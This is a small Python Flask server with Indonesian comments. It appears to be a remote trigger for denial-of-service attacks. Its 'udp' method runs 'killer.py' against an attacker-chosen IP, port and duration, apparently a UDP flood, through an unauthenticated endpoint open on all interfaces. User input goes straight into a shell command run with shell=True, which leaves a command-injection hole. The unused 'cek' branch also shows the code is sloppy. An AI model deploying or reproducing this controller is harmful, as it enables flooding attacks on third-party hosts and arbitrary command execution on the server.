from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/api', methods=['GET'])
def api():
    method = request.args.get('method')
    path = request.args.get('path')
    ip = request.args.get('ip')
    port = request.args.get('port')
    time = request.args.get('time')

    if method == 'cek':
        command = f"ls {path}"
    if method == 'udp':
        command = f"python killer.py -i {ip} -p {port} -t {time}"
        # Jalankan command dan dapatkan outputnya
        output = run_command(command)
        return jsonify({'output': output})
    else:
        return jsonify({'error': 'Method tidak valid'})

def run_command(command):
    # Implementasi untuk menjalankan command di sini
    # Misalnya menggunakan modul subprocess
    import subprocess
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=6655)